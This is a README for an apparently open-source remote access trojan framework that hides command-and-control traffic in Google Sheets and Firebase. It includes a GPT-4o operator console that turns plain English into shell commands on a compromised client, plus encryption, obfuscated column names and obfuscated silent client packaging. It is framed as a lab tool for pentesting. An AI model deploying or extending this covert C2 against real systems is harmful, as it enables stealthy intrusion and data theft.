# SaaS RAT — A Pluggable Remote Access Framework

A framework for building covert remote access tools that route command-and-control traffic through legitimate SaaS platforms. The pluggable architecture supports swappable channels, encryption methods, and fragmentation strategies — allowing operators to adapt the transport layer without changing the core.

**Currently implemented channel: Google Sheets.** Commands are dispatched through a shared spreadsheet. The client polls for tasks, executes them, and writes results back. An AI-powered operator console (GPT-4o) translates natural language into commands and interprets results in real time. All traffic goes to `docs.google.com`.

Built for security research and authorized penetration testing in controlled lab environments.

---

## Architecture

```
┌─────────────────────────────────────────────────────┐
│                  Google Sheets                      │
│                                                     │
│              ┌──────────┐   ┌──────────────┐        │
│              │  inbox   │   │   outbox     │        │
│              │ (tasks)  │   │  (results)   │        │
│              └──────────┘   └──────────────┘        │
└──────────────────────┬──────────────┬───────────────┘
                       │              │
          Forms POST   │              │   Forms POST
          (write)      │              │   (write)
                       │              │
            ┌──────────▼──┐      ┌────▼──────────┐
            │   server.py │      │   client.py   │
            │             │      │               │
            │  send       │      │  cycle loop   │
            │  collect    │      │  execute      │
            │  ai (GPT4o) │      │  heartbeat    │
            └─────────────┘      └───────────────┘
```

**Communication flow:**

- Server writes tasks → inbox tab via Google Forms POST
- Client reads inbox → CSV export (unauthenticated read)
- Client writes results → outbox tab via Google Forms POST
- Server reads outbox → CSV export

All traffic goes to `docs.google.com`. Google Forms is the only unauthenticated append endpoint for Google Sheets — no API keys or OAuth required on the client.

---

## Quick Demo

The demo runs the client inside Docker (simulates a remote compromised machine) and the server locally (operator console). You are the attacker. The container is the victim.

```
Your terminal (server.py ai)
        ↓  Google Sheets  ↑
  Docker container (victim)
```

Two container options — pick one:

| Container | Command | What it is |
|---|---|---|
| **victim** | `docker compose up victim` | Ubuntu 20.04 with deliberately misconfigured services (SSH, FTP, MySQL, Samba, Apache). Recommended for demos. |
| **client** | `docker compose up client` | Minimal python:3.11-slim. No extra services — for basic C2 testing. |

### Prerequisites

- Python 3.9+ with venv
- Docker + Docker Compose
- An OpenAI API key
- A `.env` file (see tracks below)

### Track A — Pre-configured (recommended for evaluation)

If you received a `.env` file:

```bash
git clone https://github.com/FelmanNadav/saas-rat.git
cd saas-rat
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt

# Drop the .env file you received into the project root
# Then start the victim container:
docker compose up --build -d victim

# Wait ~5 seconds for the client to connect, then start the server:
python server.py ai
```

### Track B — Configure yourself

```bash
git clone https://github.com/FelmanNadav/saas-rat.git
cd saas-rat
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt

# Run the interactive setup wizard (~5 min, requires a Google account):
python setup_wizard.py

# Then start the victim container:
docker compose up --build -d victim

# Wait ~5 seconds, then start the server:
python server.py ai
```

See [docs/setup_wizard.md](docs/setup_wizard.md) for a full walkthrough.

### Demo commands to try

Once the AI console is running, try these in plain English:

```
> list the home directory
> create a file called hello.txt containing "interview test"
> show me what's in hello.txt
> what user am I running as
> what is the OS and hostname
> remove hello.txt
```

**Notes:**
- The default mode is `mode confirm` — the AI proposes a command and you approve it before it runs. Type `yes` or `go` to confirm.
- Type `help` at any time to see all REPL commands.
- Results arrive asynchronously — the server polls the sheet in the background and displays results as they arrive.
- See [docs/ai_console.md](docs/ai_console.md) for the full AI console reference.

---

## File Structure

```
saas-rat/
├── client.py            # Polling agent — reads tasks, executes, writes results
├── server.py            # Operator interface — send, collect, AI console
├── common.py            # Shared utilities — encryption, fragmentation, channel registry
├── system_prompt.txt    # GPT-4o system prompt — edit to change AI behavior
├── setup_wizard.py      # Interactive setup wizard — writes .env step by step
├── packager.py          # Builds standalone client binaries (PyInstaller/Nuitka)
├── channel/
│   ├── base.py          # Abstract Channel interface + refresh interval management
│   └── sheets.py        # Google Sheets/Forms implementation (SheetsChannel)
├── crypto/
│   ├── base.py          # Abstract Encryptor class
│   ├── plaintext.py     # Pass-through (no encryption, default)
│   └── fernet.py        # AES-128-CBC + HMAC-SHA256 via cryptography.Fernet
├── fragmenter/
│   ├── base.py          # Abstract Fragmenter class
│   ├── passthrough.py   # No fragmentation (default)
│   └── fixed.py         # Fixed-size chunks (FRAGMENT_CHUNK_SIZE bytes)
├── wizard/
│   ├── core.py          # Shared prompt utilities
│   ├── channel/         # Channel setup wizards
│   ├── crypto/          # Encryption setup wizards
│   └── fragmenter/      # Fragmentation setup wizards
├── docs/                # Per-tool documentation
│   ├── ai_console.md    # AI console reference
│   ├── packager.md      # Client packaging guide
│   └── setup_wizard.md  # Setup wizard walkthrough
├── ideas/               # Design docs for planned features
├── .env                 # Runtime config (not committed)
├── .env.example         # Template with all required and optional keys
├── Dockerfile           # Minimal client container (python:3.11-slim)
├── Dockerfile.victim    # Full victim environment (Ubuntu 20.04 + services)
├── docker-compose.yml   # Defines both client and victim services
├── docker/
│   └── victim/
│       └── start.sh     # Victim container entrypoint (starts services + client)
└── requirements.txt     # Python dependencies
```

---

## Prerequisites

**Core (server + client):**
- Python 3.9+
- A Google account
- Internet access to `docs.google.com`

**AI console only:**
- An OpenAI API key (`server.py ai`)

**Docker client:**
- Docker + Docker Compose (`docker compose up --build`)

**Client packaging (`packager.py`):**
- See [docs/packager.md](docs/packager.md)

---

## Installation

```bash
git clone https://github.com/FelmanNadav/saas-rat.git
cd saas-rat
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Setup

Run the interactive setup wizard:

```bash
python setup_wizard.py
```

The wizard walks through encryption, column obfuscation, channel config, fragmentation, and extras — then writes `.env`. See [docs/setup_wizard.md](docs/setup_wizard.md) for a full walkthrough including manual setup instructions.

---

## Usage

### CLI help

```bash
python server.py --help
```

### Start the client

```bash
# Locally
source venv/bin/activate
python client.py

# Minimal Docker container (python:3.11-slim, no extra services)
docker compose up --build client

# Full victim environment (Ubuntu 20.04 + SSH/FTP/MySQL/Samba/Apache)
docker compose up --build victim
```

The client sends a heartbeat on startup and every N cycles (configurable). Each heartbeat includes system info and cycle timing — the server uses this to automatically sync its refresh interval.

### Victim container

`Dockerfile.victim` builds a Ubuntu 20.04 image with deliberately misconfigured services that mirror a classic Metasploitable2-style target. Useful for demos where realistic recon output matters.

| Service | Port | Access |
|---|---|---|
| Apache | 80 (→ 8080 on host) | `http://localhost:8080` |
| SSH | 22 | `msfadmin:msfadmin` / `root:root` |
| FTP | 21 | anonymous login |
| MySQL | 3306 | `root` / empty password |
| Samba | 445 | guest ok, world-writable share |

Pre-seeded state: MySQL `webapp` database with a `users` table (MD5-hashed passwords), `/home/msfadmin/.env` with fake API keys, `/home/msfadmin/TODO.txt` with credential rotation reminders.

The C2 client runs inside the container. From the operator's perspective it is an ordinary connected client — the services are there to make AI console recon scenarios realistic.

### Dispatch a command

```bash
python server.py send --command system_info
python server.py send --command shell --payload '{"cmd": "whoami"}'
python server.py send --command config --payload '{"cycle_interval_sec": "10"}'
```

### Read results

```bash
python server.py collect
python server.py collect --id <command_id>
```

### AI operator console

```bash
python server.py ai
```

Type commands in plain English. GPT-4o translates them into structured actions, dispatches to the client, and interprets results as they arrive.

> **AI disclaimer:** GPT-4o is non-deterministic — the same prompt may produce different commands across sessions. Always use `mode confirm` (the default) when in doubt. Destructive commands (`rm -rf`, `kill -9`, `shutdown`, `dd`, `mkfs`) are always intercepted and require explicit confirmation regardless of mode.

See [docs/ai_console.md](docs/ai_console.md) for the full reference.

---

## Available Commands

| Command | Payload | Description |
|---------|---------|-------------|
| `system_info` | none | OS, hostname, architecture, username, Python version |
| `echo` | `{"msg": "..."}` | Returns payload as-is |
| `shell` | `{"cmd": "..."}` | Runs a shell command; optional `"stdin"` for interactive input |
| `config` | see below | Updates client config in-memory; resets on restart |

### Config keys

| Key | Default | Description |
|-----|---------|-------------|
| `cycle_interval_sec` | `1` | Base sleep between client cycles (seconds) |
| `cycle_jitter_min` | `2` | Minimum random jitter added per cycle (seconds) |
| `cycle_jitter_max` | `3` | Maximum random jitter added per cycle (seconds) |
| `heartbeat_every` | `5` | Send a heartbeat every N cycles |
| `client_id` | `NADAV` | Client identifier reported in results |

Only listed keys are accepted — unknown keys are silently ignored. All changes are in-memory; re-send config after client restart.

**Shell handler notes:**
- 30 second timeout — hanging commands return a timeout error
- `stdin` defaults to `/dev/null` to prevent interactive prompts from blocking

---

## Channels

Two channel backends are available. Set `CHANNEL` in `.env` to select.

| `CHANNEL` | Traffic | Cleanup | Docs |
|---|---|---|---|
| `sheets` (default) | `docs.google.com` | Auto-delete via service account (optional) or manual cleanup script | [docs/setup_wizard.md](docs/setup_wizard.md) |
| `firebase` | `firebaseio.com` | Auto-delete after result (inbox + outbox) | [docs/firebase.md](docs/firebase.md) |

Both channels use the same encryption, fragmentation, and command interface. Switching channels requires only a `.env` change and wizard re-run.

---

## Configuration

Copy `.env.example` to `.env` and fill in all values. The setup wizard does this for you.

```env
# Channel selection
CHANNEL=               # "sheets" (default) or "firebase"

# Google Sheets (CHANNEL=sheets)
SPREADSHEET_ID=          # From sheet URL: /d/<ID>/edit
INBOX_GID=               # ?gid=X when inbox tab is selected
OUTBOX_GID=              # ?gid=X when outbox tab is selected
FORMS_URL=               # Outbox form URL ending in /formResponse
FORMS_FIELD_MAP=         # JSON: {"command_id":"entry.X","client_id":"entry.X",...}
INBOX_FORMS_URL=         # Inbox form URL ending in /formResponse
INBOX_FORMS_FIELD_MAP=   # JSON: {"command_id":"entry.X","command":"entry.X",...}

# Firebase (CHANNEL=firebase)
FIREBASE_URL=                  # https://<project-id>-default-rtdb.firebaseio.com
FIREBASE_INBOX_PATH=           # c2/inbox (default)
FIREBASE_OUTBOX_PATH=          # c2/outbox (default)
FIREBASE_INBOX_COLUMN_MAP=     # JSON: {"command_id":"f3a7k",...} — optional field name obfuscation
FIREBASE_OUTBOX_COLUMN_MAP=    # JSON: {"command_id":"p7c4s",...} — optional field name obfuscation

# Encryption
ENCRYPTION_METHOD=       # "plaintext" (default) or "fernet"
ENCRYPTION_KEY=          # Fernet key — generated by setup wizard

# Column obfuscation (optional, Sheets only)
INBOX_COLUMN_MAP=        # JSON: {"command_id":"f3a7k","command":"x9m2p",...}
OUTBOX_COLUMN_MAP=       # JSON: {"command_id":"p7c4s","client_id":"m1z8e",...}

# Sheets auto-cleanup (optional, Sheets only)
GOOGLE_SERVICE_ACCOUNT_JSON=  # Path to service account JSON key — enables auto row deletion

# Fragmentation
FRAGMENT_METHOD=         # "passthrough" (default) or "fixed"
FRAGMENT_CHUNK_SIZE=     # bytes per chunk when using "fixed" (default 2000)

# OpenAI
OPENAI_API_KEY=          # Required for ai mode only

# Client
CLIENT_ID=               # Client identifier (default: NADAV)
```

---

## Encryption

Applied transparently at the channel boundary. All field values are encrypted before writing and decrypted after reading.

| `ENCRYPTION_METHOD` | Description |
|---------------------|-------------|
| `plaintext` (default) | No encryption — cleartext values in sheet |
| `fernet` | AES-128-CBC + HMAC-SHA256, key from `ENCRYPTION_KEY` |

The setup wizard generates the Fernet key automatically. Both machines must use the same method and key.

---

## Fragmentation

Large results are split into fixed-size chunks. Keeps individual HTTP requests below Google Forms' ~4000 character field limit.

| `FRAGMENT_METHOD` | Description |
|-------------------|-------------|
| `passthrough` (default) | No fragmentation — result sent in a single write |
| `fixed` | Split into `FRAGMENT_CHUNK_SIZE` byte chunks (default 2000) |

---

## Column Name Obfuscation

Replaces logical column headers with short random strings. Values can be encrypted independently — the two features compose.

| `ENCRYPTION_METHOD` | Column maps set | Sheet appearance |
|---------------------|-----------------|------------------|
| `plaintext` | No | Readable names, cleartext values — debug mode |
| `plaintext` | Yes | Random names, cleartext values |
| `fernet` | No | Readable names, encrypted values |
| `fernet` | Yes | Random names, encrypted values — full production mode |

---

## Client Packaging

`packager.py` builds standalone client binaries with four obfuscation profiles (basic, UPX, PyArmor, Nuitka) and an optional silent mode that strips all console output.

```bash
python packager.py
```

See [docs/packager.md](docs/packager.md) for the full guide including prerequisites, profile comparison, and cross-platform notes.

---

## Limitations

**All channels:**
- **Background result pollers time out after 5 minutes.** When a command is sent, the server watches the outbox for a matching result. If no result arrives within 5 minutes the watcher stops. The result is **not lost** — retrieve it with `server.py collect --id <command_id>`.
- **Single client per session** — multi-client routing is not implemented. The server broadcasts to all clients indiscriminately. Run one client at a time.

**Sheets channel:**
- Google Forms is append-only — inbox and outbox grow until cleared. Set `GOOGLE_SERVICE_ACCOUNT_JSON` for automatic per-message deletion, or run `sheets_c2_cleanup.gs` manually.
- Result fields truncated at ~4000 characters (Google Forms field size limit) — use `FRAGMENT_METHOD=fixed` for large payloads
- The `form_timestamp` column added by Google Forms cannot be removed and is always visible

**Firebase channel:**
- Fragment inbox entries (`{id}_f0`, `{id}_f1`, ...) are not auto-deleted — clear manually via the Firebase console if fragmentation is used
- Database is world-readable in test mode — always enable Fernet encryption

---

## Roadmap

See `ideas/` for detailed design docs.

| Feature | Status |
|---------|--------|
| Pluggable channel abstraction | Done |
| Fernet encryption | Done |
| Fixed-size fragmentation | Done |
| Column obfuscation | Done |
| Setup wizard (auto + manual) | Done |
| Self-synchronising server refresh interval | Done |
| Client packaging (basic, UPX, PyArmor, Nuitka profiles) | Done |
| Firebase Realtime Database channel | Done |
| Victim demo container (Ubuntu 20.04, Metasploitable2-style) | Done |
| Sheets auto-cleanup via service account (per-message row deletion) | Done |
| Firebase auto-cleanup (inbox + outbox after confirmed result) | Done |
| `switch_channel` command (mid-op channel pivot) | Done |
| `switch_encryption` command (change crypto mid-op) | Planned |
| `switch_fragmenter` command (change fragmentation mid-op) | Planned |
| Multi-client routing via `target` field | Planned |
| `load_module` command (exec-over-the-wire) | Planned |
